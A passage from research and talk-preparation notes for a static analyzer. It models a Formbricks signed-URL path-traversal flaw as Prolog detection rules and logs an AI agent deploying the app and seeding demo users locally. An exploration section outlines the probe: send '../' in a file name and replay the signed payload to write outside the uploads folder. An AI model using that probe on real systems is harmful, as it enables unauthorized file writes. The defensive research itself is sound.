    kb_call_resolved(UrlCtor, 'URL'),
    kb_call_within_handler(UrlCtor, Handler),
    kb_arg_i_for_call(UrlArg, 0, UrlCtor),
    kb_template_literal_tail(UrlArg, UrlPath).
```

Note: `URL` is a native WHATWG class (global in both Node and browser;
also `node:url.URL`). Whichever FQN the kbgen assigns — one catalog
entry.

**(2) Handler-pair via URL match — easy, given (1).**

```prolog
utils_signed_pair_via_url(H1, H2) :-
    utils_response_url_literal(H1, UrlPath),
    kb_func_def(H2, _, FileName, UrlPath),
    endswith(FileName, 'route.ts').
```

**(3) Capability generator/verifier pair — small hand-catalog.**

```prolog
utils_capability_pair('lib/crypto.generateLocalSignedUrl',
                       'lib/crypto.validateLocalSignedUrl').
utils_capability_pair('jsonwebtoken.sign', 'jsonwebtoken.verify').
utils_capability_pair('jose.SignJWT.sign',  'jose.jwtVerify').
% ... one row per known crypto pair, extendable per-project
```

**(4) Field-schema alignment via crypto pair — falls out of (3).**

Whichever positional args go into the generator are the fields the
verifier consumes. In formbricks: `(uuid, fileName, envId, fileType, ts)`.

```prolog
utils_signed_field(Pair, FieldName, GenArg, VerArg) :-
    utils_capability_pair(GenFqn, VerFqn),
    kb_call_resolved(GenCall, GenFqn),
    kb_call_resolved(VerCall, VerFqn),
    kb_arg_i_for_call(GenArg, I, GenCall),
    kb_arg_i_for_call(VerArg, I, VerCall),
    kb_arg_name_at(GenCall, I, FieldName),      % from AST param names
    Pair = pair(GenCall, VerCall).
```

**(5) Signed handoff as an inter-procedural dataflow edge — NOVEL.**

Currently `utils_interprocedural_dataflow_edge_from_arg_to_param/2`
models function-call boundaries. Add a new edge kind for *signed
capability boundaries*:

```prolog
utils_interprocedural_dataflow_edge(U, V) :-
    utils_interprocedural_dataflow_edge_from_arg_to_param(U, V).

% NEW: signed handoff as an implicit call across the pair
utils_interprocedural_dataflow_edge(U, V) :-
    utils_signed_pair_via_crypto(H1, H2, Pair),
    utils_signed_field(Pair, FieldName, SrcArg, _),
    kb_body_read(V, FieldName, H2),
    U = SrcArg.
```

Once *that* edge exists, `utils_dataflow_path` transparently threads
taint from `req.json()` at H1 → the signer's `updatedFileName` arg →
signed handoff → `jsonInput.fileName` at H2 → `decodeURIComponent` →
`writeFile`. **No changes to the taint engine.** The engine sees one
long path.

**This is the novel bit.** Every taint tool models call boundaries.
Very few model signed capability boundaries as first-class dataflow
edges. This is what to put on the "novel contribution" slide.

**(6) Pair-level missing-invariant predicate — medium.**

```prolog
utils_pair_missing_normalization(H1, H2, Field) :-
    utils_signed_pair_via_crypto(H1, H2, Pair),
    utils_signed_field(Pair, Field, _, _),
    kb_field_is_path_shaped(Field),                % name ~ /file|path|key|name/i
    \+ passes_through_normalizer(Field, H1),       % no path.basename/normalize
    \+ passes_through_normalizer(Field, H2).       % same on sibling
```

Where `passes_through_normalizer` is a reverse-taint reachability check
— from the field, can you reach `path.basename` / `path.normalize` / a
regex matching `/\.\./` / a `startsWith(rootDir)` check before the
sink? Small catalog of normalizers keyed by language, structurally
similar to `utils_user_input`.

### The primitive catalog (tier-1 FQNs — authN / authZ / capability / sanitizers)

Small enough to fit on one slide. Community-maintainable per framework.

| primitive class | what it does | example FQNs |
|---|---|---|
| session oracle | reads session, returns user or null | `next-auth.getServerSession`, `clerk.auth`, `iron-session.getIronSession`, `lucia.validateSession`, `supabase.auth.getSession` |
| JWT verifier | verifies signed JWT | `jsonwebtoken.verify`, `jose.jwtVerify`, `firebase-admin.auth.verifyIdToken` |
| HMAC verifier | recomputes an HMAC | `crypto.timingSafeEqual` guarding an `Hmac.digest` compare |
| password compare | timing-safe hash compare | `bcrypt.compare`, `argon2.verify`, `scrypt.verify` |
| bearer-token extractor | reads `Authorization: Bearer …` | `request.headers.get('Authorization')` + `startsWith('Bearer ')` |
| API-key lookup | fetches record by token | `prisma.apiKey.findFirst`, `prisma.apiKey.findUnique` |
| authorization gate (authZ) | ACL / role / ownership | `prisma.membership.findFirst`, `casbin.enforce`, framework `@authorize` decorators |
| **path normalizer** | strips or rejects `..` | `path.basename`, `path.normalize` + prefix check, regex `/\.\./` reject |
| capability generator | mints signed capability | `lib/crypto.generateLocalSignedUrl`, `jsonwebtoken.sign`, `jose.SignJWT.sign` |
| capability verifier | verifies signed capability | `lib/crypto.validateLocalSignedUrl`, `jsonwebtoken.verify`, `jose.jwtVerify` |

### "Turtles all the way down" — the firewall

**You do not tag wrappers. You catalog leaves and follow the call graph.**

- `checkAuth` in formbricks doesn't need a tag — dhscanner's call graph
  transitively reaches `next-auth.getServerSession` at the leaf.
- `authenticateRequest` doesn't need a tag — it bottoms out at
  `prisma.apiKey.findFirst`.
- Only *leaves* belong in the FQN catalog; transitive-call closure
  carries the "this handler is authN-gated" property upward
  automatically.

Structural fallback for hand-rolled auth (no library primitive at the
leaf):

- **"Function returns `T | null` and its result is consumed by an
  `if (!x) return <4xx>` in a handler."** Catches ~90% of custom
  wrappers by the return-null-then-early-return idiom.
- **"Function whose result unconditionally drives an early-return with
  an error response in a handler."** The consumer's shape is often more
  identifiable than the function's own.

### Two-tier catalog architecture (the Semgrep/CodeQL comparison)

Every mature SAST ships this split. dhscanner's variant is what makes
its differentiation defensible:

- **Tier 1 (data) — FQN facts.** Community-maintainable YAML/JSON per
  framework. Direct analog to Semgrep's rule registry, CodeQL's
  security library, Bandit's sink list, gosec's catalog. Version-scoped
  (NextAuth v4 vs v5 renamed things; Auth.js diverged entrypoints — the
  catalog must track).
- **Tier 2 (logic) — rules over tagged facts.** In dhscanner: two
  sub-layers:
    - **2a — dhscanner corpus.** Primitive predicates
      (`utils_dataflow_path`, `utils_response_url_literal`,
      `utils_signed_pair_via_crypto`, `utils_pair_missing_normalization`, …).
      Maintained by dhscanner authors, versioned with the tool.
    - **2b — LLM-composed queries at runtime.** Given the fact space,
      the LLM invents the vuln-shape predicate for this codebase. No
      per-vuln rule authoring. **This is the departure from
      Semgrep/CodeQL**, which require human authors for tier 2.
      dhscanner requires human authors only for tier 1.

**Slide one-liner:** *"Semgrep authors patterns; CodeQL authors
queries; dhscanner authors only the vocabulary — the vulnerability-
shape sentences are composed by the LLM from that vocabulary at query
time."*

### Textbook exploration flow the loop should trace

Idealized order — observed behaviour *will* diverge, and that's a
data point:

1. **Enumerate unauthenticated endpoints, explore them.** Fast pre-auth
   sweep. In this repo the sweep returns nothing directly exploitable
   — that's a data point *in favor of* formbricks's baseline hygiene,
   not a dead end. The loop should note "no pre-auth findings" and
   escalate scope.
2. **Enumerate authenticated endpoints.** Discover H1 as an
   authenticated upload endpoint whose response emits a `signedUrl`
   template literal with a static tail.
3. **Follow the static URL tail.** Match against known routes; discover
   H2 as the byte-sink. Inspect H2: transitive taint from `req.json()`
   to `fs/promises.writeFile` with no path normalizer on the way.
   *Per-endpoint, this alone triggers `arbitrary_file_write`.*
4. **Circle back to H1.** Ask: does H1 normalize `fileName` before
   signing? Trace: `fileName` → `updatedFileName` (`split('.')` +
   `slice(0,-1)` + join) → `generateLocalSignedUrl`. No normalization.
   → responsibility-matrix column `path safe` is `✗` on *both* endpoints
   → pair-level finding.
5. **Emit a DAST candidate.** `(H1, H2, fileName)` as a tuple, with a
   proposed probe: send `../` in `fileName` to H1, take the returned
   signed payload verbatim to H2, expect a file outside `uploads/`.
   *DAST verification is out of scope for the static side; the tuple
   is the handoff.*

### Why the hybrid dominates pure-LLM (defensive framing for Q&A)

Anticipated challenge from the audience: *"why not just feed the whole
codebase to a large LLM?"* Honest answer:

- **Facts vs. hypotheses.** KB lookups ("does H2 transitively call P?
  list all handlers that emit a signed URL") are microseconds and
  deterministic. LLM answering the same requires the codebase in
  context — 500k–1M tokens for a 100k-LOC repo, per query. Empirical
  point from this project: the deterministic Phase-1 provisioning took
  **0.2 s / 0 tokens**; the LLM Phase-2 fallback for the same task
  took **106 s / 1M+ tokens**. Five orders of magnitude gap on the
  same question.
- **Correctness.** LLM answering "does H transitively call P?"
  sometimes says yes when the answer is no. Not fixable by scaling —
  it's plausible-connection hallucination. KB has the edge or doesn't.
- **Exhaustiveness.** LLM asked to list all handlers loses some to
  attention decay. KB returns all or errors out honestly.
- **Reproducibility.** KB gives the same answer every run. LLM has
  run-to-run variance.

Honest concession worth naming: for a **novel idiom with no stable
FQN** — hand-rolled crypto, custom auth without any cataloged
primitive — a KB with an incomplete catalog silently misses it. That
is the only domain where pure-LLM has genuine edge, and it's exactly
where the hybrid crosses over: LLM proposes "look for something shaped
like X" as a new predicate, dhscanner enumerates cheaply, the loop
converges.

### Slide-worthy one-liners (curate for the deck)

- *"Neither endpoint is wrong; the pair is wrong — and no per-endpoint
  SAST can, in principle, compute that."*
- *"We model signed capabilities as inter-procedural dataflow edges;
  this unlocks pair-level properties no per-endpoint tool can express."*
- *"Semgrep authors patterns; CodeQL authors queries; dhscanner authors
  only the vocabulary — the vulnerability-shape sentences are composed
  by the LLM from that vocabulary at query time."*
- *"Facts are cheap and deterministic in a KB; hypotheses are cheap and
  stochastic in an LLM. Any architecture that puts either on the wrong
  side of that line is paying for it."*
- *"Anyone who says 'the LLM can do everything' is proposing to pay to
  re-derive `grep` at inference time."*

---

## Open work items (post-handoff, ordered by unblocking value)

1. ~~**Identify the fix commit SHA in the formbricks repo.**~~
   **DONE 2026-08-05.** Commit
   [`9d84bc0`][2] (PR #6375). Full analysis in §"Fix commit — what
   shipped in v4.0.0" above.
2. ~~**Read the fix diff.**~~ **DONE 2026-08-05.** The maintainers
   picked **"re-validate at the byte-sink (defense in depth)"** —
   installed a 12-line `validateAndResolvePath` helper at the shared
   consumer service layer, applied to all four filesystem-touching
   operations. Not any of the other four options listed in the
   original speculation. See §"Fix commit" for the full read and
   §"The delete flow" for the surprise: one of the four call sites
   they patched (`deleteLocalFile`) is reached from a *structurally
   different* single-endpoint bug, not the H1/H2 cooperation.
3. ~~**Enumerate siblings from the fix commit.**~~ **DONE 2026-08-05.**
   M = 4 sink call sites in `apps/web/lib/storage/service.ts`
   (`ensureDirectoryExists`, `getLocalFile`, `putFileToLocalStorage`,
   `deleteLocalFile`). Feeds directly into TODO 3's N-of-M recall
   metric. Additional candidate not touched by the fix (would count
   as `novel_candidates_not_in_fix`): the `client/[environmentId]/storage/local`
   private-mode counterpart of H2, architecturally identical.
4. **Grant Alice/Bob project access** so they can reach H1/H2 without
   escalating to `owner`. Insert one `Team` in the demo org, one
   `TeamUser` per peer, one `ProjectTeam` on the demo project. Enables
   the peer-user variant of the seed reproduction (and any sibling
   BOLA hunting that comes out of TODO 3). This is caveat 5 of the
   User-provisioning section below, now made concrete by the vuln
   class being known.
5. **Verify the empirical prediction** that `arbitrary_file_write/1`
   already fires on H2 at v3.16.0 by inspecting
   `tests/expected/formbricks.sarif.json`. And — new since resolving
   items 1-3 — verify the same rule (retargeted at `fs.unlink`)
   fires on the DELETE handler at
   `apps/web/app/storage/[environmentId]/[accessType]/[fileName]/route.ts`.
   That's Direction A of the sibling loop, and it should hit even
   without any of the six new pair-level predicates.
6. **Prototype the six new predicates** (`utils_response_url_literal`,
   `utils_signed_pair_via_url`, `utils_capability_pair`,
   `utils_signed_field`, the signed-handoff dataflow edge,
   `utils_pair_missing_normalization`) against the running kbapi
   without redeploying — the local kbapi accepts ad-hoc Prolog
   appends.
7. **Add tier-1 primitive catalog rows** for the formbricks-observed
   values of each row in the "primitive catalog" table under
   §"Static analysis architecture". These are the three enumeration
   tasks that open the next session — see
   §"Next-session tasks (handoff 2026-08-05)" at the bottom of the
   file for the concrete work list.

---

## TODO 1 — local instance (characterize + admin + two peer users)

Effort characterization is *itself* a deliverable: we need to know if
bring-up is 10 minutes or 3 hours before we commit it to the talk
timing budget.

- [x] pick the pre-fix commit sha. **DONE 2026-08-05.** Fix commit is
      [`9d84bc0`][2] (PR #6375); pre-fix baseline is its parent,
      `9d84bc0^`. See §"Fix commit — what shipped in v4.0.0" for the
      full read. Note: local instance is *still deployed at v3.16.0*
      per "Deployment characterization" below, not at `9d84bc0^` — the
      re-deploy at the exact pre-fix commit is still pending (unchanged
      from the original TODO).
- [x] follow formbricks' standard docker-compose bring-up (they publish
      one; verify it still works *at the pre-fix commit*, since compose
      files sometimes drift and only line up with `HEAD`). Capture any
      patches needed as inline shell snippets, phpbb.md-style.
      **Done at `v3.16.0` via `agent/launcher.py` — see "Deployment
      characterization" below.** Re-run required once pre-fix SHA is picked.
- [x] provision three accounts, all in the same organization:
      - `admin@example.com` — org admin
      - `alice@example.com` — peer, membership: `member`
      - `bob@example.com`   — peer, membership: `member`
      Point: Alice and Bob own **distinct resources** so BOLA /
      authorization queries have real ground to distinguish.
      **Done via `agent/provisioner.py` + post-hoc DB fix-up — see
      "User provisioning characterization" and "Post-provisioning
      fix-up" below.** Distinct-resource ownership for Alice/Bob is
      *not yet* set up (they're members of the same org but have no
      `Team` / `ProjectTeam` grants); needed only once we know the
      exact resource type the seed vulnerability BOLAs on.
- [x] capture ports / URLs / credentials / DB dump commands in this file
      (same style as `demo/phpbb.md` §"Accounts" / §"URLs").
- [ ] verify the flaw is manually reproducible: Alice's session cookie
      targeting Bob's resource id → 200 instead of 4xx. Copy the exact
      curl (or `Invoke-WebRequest`) that demonstrates this into
      §"Manual reproduction of the seed" below.
- [x] characterize: total wall-clock from `docker compose up` to a
      confirmed reproduction, and note any manual clicks that couldn't
      be scripted. This number goes on a slide. **Deploy + provision
      numbers captured below; reproduction number still pending on the
      previous TODO.**

### Deployment characterization — agent launcher run @ `v3.16.0`

First empirical data point for the "how much manual effort" bullet. Recorded
here so the OWASP slide has real numbers instead of a hand-wave, and so the
next session can decide whether to (a) trust this recipe against a
pre-fix commit or (b) redo the measurement once the pre-fix SHA is picked.

**Setup.**

- Driver: `agent/launcher.py` (invoked as `pipenv run python -m cli
  launch-local-app ..\formbricks --max-iterations 5 --model gpt-5.5`).
  Instrumented to persist `summary.json` + per-iteration `plan.json`,
  `outcome.json`, `model_calls.json` under
  `agent/.launch_logs/formbricks/<utc-timestamp>/`.
- Model: **gpt-5.5** via `chat.completions` + structured outputs + function
  tools. Downshifted from the newer `gpt-5.6-sol` because the reasoning
  models refuse `chat.completions` + tools unless `reasoning_effort=none`;
  fixing that requires migrating the launcher to `/v1/responses`, which
  we intentionally deferred.
- Host: Windows 10, PowerShell, Docker Desktop, WSL2 backend.
- Target commit: **`ec78038c` (tag `v3.16.0`, 2025-07-18)**. This is a
  Windows checkout — CRLF line endings are the origin of two of the four
  failure classes below.
- Formbricks tree stayed clean: everything the model wrote landed under
  `../formbricks/.docker-launch/` (`Dockerfile.formbricks`, `migrate.sh`,
  BuildKit secrets `database_url` + `encryption_key`) and
  `../formbricks/docker-compose.launch.yml`. No edits to `apps/web/**`.

**Iteration table (from `outcome.json` per iteration).**

| iter | wall | verdict | failure signal | model's next-iter fix |
|---:|---:|---|---|---|
| 1 | 3 min | rejected | `docker build` exit 17 (really `sh: /tmp/read-secrets.sh: not found`) | `sed -i 's/\r$//' /tmp/read-secrets.sh && chmod +x` in a patched Dockerfile written to `.docker-launch/Dockerfile.formbricks` |
| 2 | 15 min | rejected | port refused on `/health` (connection actively refused) | diagnosed as second CRLF site: `/home/nextjs/start.sh` (from `next-start.sh`) → add it to the same `sed` normalization |
| 3 | 13 min | rejected | TCP accepts then `RemoteDisconnected` — server up, request pipeline crashes | added a one-shot `migrate` compose service invoking `packages/database/dist/scripts/apply-migrations.js` |
| 4 | 13 min | rejected | migration container exit 1: Prisma `P1012 — datasource property 'url' is no longer supported` (Corepack pulled Prisma **7.9.1**, schema uses the 6.x form) | pin `prisma@6.7.0` and `pnpm@9.15.9` at Dockerfile-runner stage |
| 5 | 14 min | **accepted** — `/health` returned 200 on **the first probe attempt** | — | — |

**Failure taxonomy (what each rejection actually was).**

Four distinct failure classes, each a different layer of the stack:

1. **CRLF #1 — build time.** Docker build died at exit 17 because
   `apps/web/scripts/docker/read-secrets.sh` had Windows line endings, and
   Alpine's `/bin/sh` treated the trailing `\r` as part of the interpreter
   path. Effect: `sh: /tmp/read-secrets.sh: not found`. Fix: `sed -i
   's/\r$//'` + `chmod +x` in a patched Dockerfile.
2. **CRLF #2 — runtime.** Image built fine, container started, but
   `/health` was *connection refused* — nothing bound to the port. Same
   CRLF bug, different script: `next-start.sh` copied into
   `/home/nextjs/start.sh`. Container was up but the entrypoint crashed
   before Next.js could bind. Fix: extend the same `sed` to normalize
   `start.sh` too.
3. **Missing DB migration.** Server actually bound this time, but the
   connection got *accepted then closed* on every probe — the app was
   answering the socket and then blowing up on the first DB query because
   the schema had never been created. Fix: add a one-shot `migrate`
   compose service that runs
   `packages/database/dist/scripts/apply-migrations.js` before bringing
   up the web tier.
4. **Prisma major-version drift.** The migration container failed with
   `P1012 — The datasource property 'url' is no longer supported in
   schema files`. Corepack pulled **Prisma 7.9.1**, but Formbricks at
   this commit still uses the 6.x schema form (`datasource db { url =
   env("DATABASE_URL") }`). Fix: pin `prisma@6.7.0` (and `pnpm@9.15.9`
   for good measure) at the Dockerfile-runner stage.

Two of those (1, 2) are **host-portability bugs** that only surface on a
Windows checkout — a Linux clone would have skipped iterations 1 and 2
entirely. The other two (3, 4) are **real upstream bugs in the Formbricks
image recipe at `v3.16.0`** and would bite anyone: `apps/web/Dockerfile`
doesn't run migrations, and `package.json` doesn't pin Prisma tightly
enough for Corepack to pick a compatible major. So on a Linux host at the
same commit, expect the launcher to converge in **~2 iterations instead
of 5** (~25-30 min instead of 58), hitting only failures 3 and 4.

The model diagnosed all four classes unaided from container output —
none of these were hinted at by a human between iterations.

**Aggregate cost (from `summary.json`).**

| metric | value |
|---|---|
| wall clock, cold start to `/health = 200` | **3495 s ≈ 58 min 15 s** |
| iterations used | 5 / 5 |
| OpenAI calls (planning + tool round-trips) | 35 |
| total tokens | 986 978 (958 399 prompt / 28 579 completion) |
| prompt-heavy ratio | ~33× prompt vs completion — driven by feeding the full file tree + prior iterations back each round |

**Honest characterization for the slide.**

- **Automation actually held.** Every rejection was self-diagnosed by the
  model from container stderr/stdout. Zero human hints between iterations.
  No file inside `../formbricks/apps/**` or `../formbricks/packages/**`
  was touched by a human; every patch went into the quarantined
  `.docker-launch/` overlay and got applied at build time.
- **Human touch, end to end.**
    - 1 × put fresh `OPENAI_API_KEY` in top-level `.env` (~30 s).
    - 1 × invoke the launcher.
    - 1 × downshift `--model` from `gpt-5.6-sol` to `gpt-5.5` after the
      first 400 response — a one-flag change, not a code change.
    - **Total human interaction with the deployment: ~1 minute.**
- **Where the cost went.** The 58 minutes are almost entirely
  `docker build` (Alpine + `pnpm install --frozen-lockfile` for the whole
  monorepo, ×5). If iter-1 and iter-2 had converged faster, the trailing
  three iterations would each have benefited from BuildKit layer cache.
  The OpenAI portion is single-digit dollars at gpt-5.5 pricing; the
  Docker portion is the wall-clock.
- **What is *not* portable.** The winning plan pins Prisma CLI to 6.7.0.
  That value is specific to this Formbricks checkout — the CLI version
  compatible with the schema will change at other commits. When we
  eventually rerun this at the pre-fix commit, expect iter-1 to already
  need a different pin, so budget for another launcher pass.
- **What the newer model would have bought us.** Nothing on this run
  (gpt-5.5 was capable enough), but the reasoning models likely converge
  in fewer iterations. Migrating `agent/launcher.py` from
  `chat.completions` to `/v1/responses` is the prerequisite. Deferred.

**Deployed instance (still up as of the accepting iteration).**

- URL: <http://127.0.0.1:8321> (redirects to `/setup/intro` — the first-run
  admin wizard).
- Health: `GET /health → 200 {"status":"ok"}`.
- Containers: `formbricks-local` (Next.js on 3000, mapped to host 8321)
  and `formbricks-postgres-local` (pgvector/pgvector:pg17, port not
  exposed to host).
- No users created yet — the three-account provisioning (admin + Alice +
  Bob) is still open in TODO 1 above. Options being weighed:
    - **browser click-through** at `/setup/intro` (fastest path, 0
      additional tokens, but explicitly counted as manual effort);
    - **scripted via internal HTTP** (uncertain time; would let us claim
      end-to-end automation for provisioning too);
    - **second launcher-style OpenAI loop** wrapping the above (most
      expensive; only worth it if the talk explicitly needs to claim
      *automated* user provisioning).

**Caveats we must not paper over on the slide.**

1. Deployed commit is **`v3.16.0`, not the pre-fix commit.** The demo doc
   above still points at `v4.0.0`; that tag does not exist in the local
   clone (`git tag | rg '^v4'` returns only `v4.5.0-rc.1`). This means:
    - the deployment recipe above is *proven* only at v3.16.0;
    - the whole "seed → sibling enumeration → coupling sanity check"
      arc still needs a real pre-fix SHA nailed down before it can be
      measured;
    - once that SHA is picked, expect to re-run the launcher for a
      second characterization pass.
2. The 58-minute wall-clock is on a **cold Docker cache**. A second run
   at the same commit would be dramatically faster (mostly `pnpm install`
   layer replay), but that number is not what we should quote for
   "first-time reproducibility."
3. Everything above is a Windows measurement. A Linux clone would not
   have hit CRLF-class failures; iter-1 and iter-2 would probably not
   have happened. That is a fair caveat but also a fair *point* —
   the model recovered from a host that the app authors did not target.

### User provisioning characterization — `python -m cli provision-users`

Second empirical data point for the "how much manual effort" bullet.
This one measures **only** account creation, on top of the deployment
run above (so wall-clock is additive if you run both cold, but they're
counted separately on the slide).

**Design shape: two-phase, deterministic-first.** The
[`agent/provisioner.py`](../agent/provisioner.py) module tries a
hand-scripted HTTP walk of the app's onboarding wizard (Phase 1, zero
LLM tokens); if any Phase-1 step fails, control escalates to an
LLM-bounded loop (Phase 2) with four tools — `http_request` against
the running target, `read_file` / `list_dir` / `grep` sandboxed to the
target's source tree, and `docker_exec` against the target's Postgres
container. The runner then does its own independent verification pass
(three NextAuth login attempts, one per user) regardless of what the
model claimed — so "phase 2 accepted" and "runner verified" are
separate axes.

Setup:

- Driver: `pipenv run python -m cli provision-users --target-url
  http://127.0.0.1:8321 --source-dir ..\formbricks --model gpt-5.5
  --max-llm-attempts 3 --max-tokens 1000000`.
- Model: **gpt-5.5** (same as the launcher run, for the same
  reasoning-model-vs-chat.completions reason).
- Fixed user spec: `admin@example.com` / `alice@example.com` /
  `bob@example.com`, one shared password (`Owasp-2026!`), organization
  `owasp-2026-demo`. Emitted into
  `agent/.provision_logs/formbricks/<utc-timestamp>/summary.json`.

**Phase 1 result: rejected on step 1, as designed.** The Formbricks
setup wizard is a `"use client"` React form that calls a Next.js
server action via `fetch()`; the action's identity is a hex hash
baked into the built JS chunks at build time. Phase 1 tries to
extract that hash by regexing hex-40 strings out of the served HTML
and the linked `/_next/static/chunks/*.js` — a good-faith attempt
that essentially never works because Formbricks' production build
uses shorter (hex-16) chunk hashes and doesn't inline the action id
in scrapable form. Phase 1 exited in ~200ms with
`failed_at:signup_admin` and 13 HTTP calls, zero tokens spent. This
failure mode is *the point of Phase 1 for this app*: it costs
milliseconds and proves the wizard is not deterministically replayable
from the outside.

**Phase 2 result: model went straight to the DB-cheat, unaided.**
Given the failure trace + the target source dir + the DB container
name, gpt-5.5 spent zero calls trying to reverse-engineer Next.js
action IDs. Its first six tool calls were source-reading (`grep` for
`bcryptjs` + `CredentialsProvider` + the Prisma schema; `read_file`
on `apps/web/lib/auth.ts` for the `hashPassword` implementation; the
NextAuth `authOptions.ts`). Then it pivoted to `docker_exec` on the
`formbricks-postgres-local` container and did:

1. `psql -c "\dt"` → discovered `User`, `Organization`, `Membership`,
   `Project`, `Environment` etc.
2. `\d "User"` × 5 tables → grabbed the full column-level schema.
3. `CREATE EXTENSION IF NOT EXISTS pgcrypto; SELECT crypt('Owasp-2026!',
   gen_salt('bf', 12))` → **used pgcrypto in the DB to produce a
   bcryptjs-compatible hash without needing a Node runtime in Python**.
   Nice trick.
4. One heredoc'd `DO $$` block inserting the organization, all three
   users (with the pgcrypto-generated hash), and all three memberships
   in a single atomic transaction.

At that point the users existed and were login-verifiable. But the
model then spent the rest of its token budget in a **spinning
verification loop** — my Phase 2 prompt (and the Phase-1 code the
model borrowed the shape of) both looked for `session.user.email` in
the `/api/auth/session` response, whereas Formbricks' NextAuth
session callback slims that down to `{id, isActive}` and drops email
entirely. Model kept re-trying logins and re-fetching sessions,
never finding the field it expected, until the token cap hit at
1,036,869 tokens (over the 1M budget by ~4%).

**But the runner's own post-phase-2 verification pass — added after
this diagnosis — logs in each user via NextAuth and checks for
`(session.user.id != '')` + `next-auth.session-token` cookie in the
jar. All three users pass this check.** So the final status becomes
`accepted` even though the model itself hit
`budget_exhausted`. `phase2.status` in the summary carries a
compound label (`success_via_external_verify (model_said=budget_exhausted)`)
so the audit trail stays honest.

**Aggregate cost (Phase 2, this run):**

| metric | value |
|---|---|
| wall clock, Phase 2 only | **106 s** |
| Phase 1 wall clock | 0.2 s (13 HTTP calls, zero tokens) |
| Phase 2 model calls | 25 |
| Phase 2 tokens | 1,036,869 (1,031,583 prompt / 5,286 completion) |
| Phase 2 `docker_exec` calls | 5 (all exit 0) |
| Phase 2 `http_request` calls to target | 12 (all 200 OK, all in the verify loop) |
| DB rows created | 1 Organization, 3 Users, 3 Memberships |

**Honest characterization for the slide.**

- **The two-phase pattern paid for itself immediately.** Deterministic
  replay was worth the ~200 ms it took to fail — the negative result
  ("wizard cannot be replayed without knowing the build-time action
  id") is itself a load-bearing data point.
- **The model outperformed my design instinct.** I wrote Phase 2
  assuming the model would try wizard replay harder before falling
  back to the DB; instead it went to the DB on turn 7 and never
  looked back. That's the *right* thing to do given the tools it has
  and the goal ("make three users exist"). The `pgcrypto`-for-bcrypt
  trick isn't documented anywhere in the Formbricks docs I've read
  — the model derived it from first principles.
- **~50% of the Phase 2 token cost was wasted on a bug in my
  verifier.** The 1M-token run is not the number the OWASP slide
  should quote; it's the ceiling of what the loop cost *with the
  verify bug*. Post-fix, the model would emit `finish(status=success)`
  after tool call ~12 (the INSERT) and one more verification call —
  I estimate **~500k tokens / ~50 s** for a warm rerun. When we get
  around to it, capture that number and quote *it*, not this one.
- **Human touch, end to end.** Same as deployment: `.env` was
  already in place, one command was invoked, no clicks. Zero
  additional human interaction with the target app across the ~2 min
  of Phase 2.

**Deployed instance state after this step (pre fix-up).**

- URL: <http://127.0.0.1:8321>
- Accounts (all password `Owasp-2026!`, all members of org
  `owasp-2026-demo`, all created 2026-08-01T18:21:57Z):

  | id | email | role |
  |---|---|---|
  | `user_owasp_admin` | `admin@example.com` | owner |
  | `user_owasp_alice` | `alice@example.com` | member |
  | `user_owasp_bob` | `bob@example.com` | member |

- Verified via NextAuth: `GET /api/auth/csrf` →
  `POST /api/auth/callback/credentials` with `{email, password}` →
  `GET /api/auth/session` returns `{user: {id, isActive: true}, expires: ...}`
  and sets `next-auth.session-token`. Same three-step sequence works
  for all three accounts.

  These readable IDs are what the model chose. They pass the DB
  (Prisma column is `text`) and pass NextAuth login — but they do
  **not** pass Formbricks' RSC-side Zod validation on the
  first page render. See "Post-provisioning fix-up" below for the
  discovery, the diagnosis, and the final DB shape (cuid2 IDs + one
  Project + two Environments) after which the UI renders cleanly for
  all three users.

**Deployed instance state after fix-up (final).**

- URL: <http://127.0.0.1:8321>
- Login page: `/auth/login`. Same three-step NextAuth sequence works
  for all three users; UI now renders end-to-end.
- Accounts (all password `Owasp-2026!`, all members of org
  `owasp-2026-demo` = `jek8hkg1pr7uvgl263kmtbu7`):

  | id | email | role | post-login UI |
  |---|---|---|---|
  | `ukitamqyw4zdr3fo4holl45e` | `admin@example.com` | owner  | environment dashboard for `owasp-2026-default` |
  | `h4m4dv89naifzfbmm8cis15l` | `alice@example.com` | member | empty-state ("no projects yet") — expected, no `ProjectTeam` grant |
  | `ejzhhhnyarpytxpwa8rzgwl5` | `bob@example.com`   | member | empty-state ("no projects yet") — expected, no `ProjectTeam` grant |

- One project + two environments, all cuid2-shaped, all owned by the
  org above:

  | kind        | id                         | detail                |
  |---          |---                         |---                    |
  | Project     | `agr63exa32m0vtzqy09eus7q` | `owasp-2026-default`  |
  | Environment | `va24mluun2v88d52p6be76af` | `production`          |
  | Environment | `o924z5ozdk5aiuot8k1ujqje` | `development`         |

**Caveats we must not paper over on the slide.**

1. Phase 2 succeeded by **bypassing the app's public API entirely**
   (direct DB inserts with a pgcrypto-generated password hash). This
   is a legitimate outcome for our OWASP demo (we needed the accounts
   to exist; we didn't need to prove the wizard works), but a
   sceptical audience will ask "would this have worked without DB
   access?". The answer is *probably yes but with more tokens* — the
   model would have had to reverse-engineer the Next.js action id
   from the built chunks and craft the multipart-or-not body, which
   is uncharted territory for a single-round loop.
2. The 1,036,869-token figure includes the "spinning verifier" waste.
   The honest headline number should be a re-measurement post-fix
   — until we do that, quote the number **with the caveat that it
   over-counts by roughly 2×**.
3. The provisioned users are functionally valid but their
   organization membership was created via raw INSERT, not via
   Formbricks' invite flow. For the *deployment* + *login* concerns
   this is indistinguishable from an invite-then-signup path, but if
   the later BOLA test we're building depends on invite-derived state
   (audit-log entries, invite-accepted timestamps, ...), we'll need
   to backfill that too.
4. **"Accepted" was premature.** The runner's own verification pass
   (NextAuth login for all three users) succeeded on the LLM-provisioned
   rows, but the *first browser hit* after login crashed on a masked
   Server Components render error. Root cause was **Zod-vs-Prisma
   asymmetry**: Formbricks writes ids with `@default(cuid())` but reads
   them back through `z.string().cuid2()`, so the model's readable ids
   (`user_owasp_admin`, `org_owasp_2026_demo`, ...) parsed as plain
   text at write time and blew up as `Invalid cuid2` at read time. Two
   more latent gaps got exposed at the same time (`Organization.billing`
   is `NOT NULL` with no default, and Formbricks won't render past
   login without at least one `Project` + one `Environment` for the
   user's org). All three fixed post-hoc via one Python script — see
   "Post-provisioning fix-up" below. The **automation-only wall-clock
   metric of 106 s therefore over-claims**: on a fresh, LLM-only run
   the model would need to be told the invariants up front, or the
   runner would need a fifth verification step (headless-browser render
   of `/`) to catch this class of crash before declaring success.
5. Alice and Bob currently land on Formbricks' "you don't have access
   to any projects yet" empty-state screen. This is *correct* for the
   Formbricks data model — org `member` role alone doesn't grant
   project access; that lives on a separate `Team` / `TeamUser` /
   `ProjectTeam` join. For the current deploy + login smoke test this
